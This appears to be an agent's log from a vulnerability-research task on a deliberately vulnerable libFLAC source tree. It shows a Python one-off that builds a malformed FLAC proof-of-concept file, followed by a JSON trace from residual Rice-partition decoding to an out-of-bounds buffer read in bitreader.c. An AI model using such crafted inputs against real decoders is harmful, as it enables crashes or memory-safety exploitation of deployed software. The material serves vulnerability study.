Running command: cd /workspace/repo-vul/src-vul/flac && python3 - <<'PY'
from pathlib import Path
src=Path('test/flac-to-flac-metadata-test-files/input-VA.flac').read_bytes()
idx=src.find(b'\xff\xf8')
# keep a valid prefix up to the first frame, then create a very long residual-looking suffix
out=bytearray(src[:idx+12])
out += bytes.fromhex('00 00 00 00 00 00 00 00 00 00 00 00')
out += b'\x00' * 8192
Path('/workspace/poc.bin').write_bytes(out)
print(len(out))
PY

{"step":4,"file":"src/libFLAC/stream_decoder.c","function":"read_residual_partitioned_rice_","line":2756,"var":"rice_parameter","code":"if(!FLAC__bitreader_read_raw_uint32(decoder->private_->input, &rice_parameter, plen)) return false;","note":"Residual partition headers are read directly from the attacker-controlled bitstream."},
{"step":5,"file":"src/libFLAC/bitreader.c","function":"FLAC__bitreader_read_rice_signed_block","line":744,"var":"cwords","code":"cwords = br->consumed_words; words = br->words;","note":"The Rice decoder snapshots its current consumed-word cursor before decoding each partition's signed residuals."},
{"step":6,"file":"src/libFLAC/bitreader.c","function":"FLAC__bitreader_read_rice_signed_block","line":780,"var":"br->buffer[cwords]","code":"b = br->buffer[cwords] << br->consumed_bits;","note":"Residual symbol decoding reads the current buffered word, so exhaustion of the buffer makes the indexed access critical."},
{"step":7,"file":"src/libFLAC/bitreader.c","function":"FLAC__bitreader_read_rice_signed_block","line":816,"var":"br->consumed_words","code":"br->consumed_bits = FLAC__BITS_PER_WORD - ucbits; br->consumed_words = cwords;","note":"As repeated residual values are decoded, the cursor advances toward the end of the available buffered data."},
{"step":8,"file":"src/libFLAC/bitreader.c","function":"FLAC__bitreader_read_raw_uint32","line":384,"var":"br->buffer[br->consumed_words]","code":"const brword word = br->buffer[br->consumed_words];","note":"The sink is the final indexed buffer read when another residual bit read is attempted from an exhausted position."}
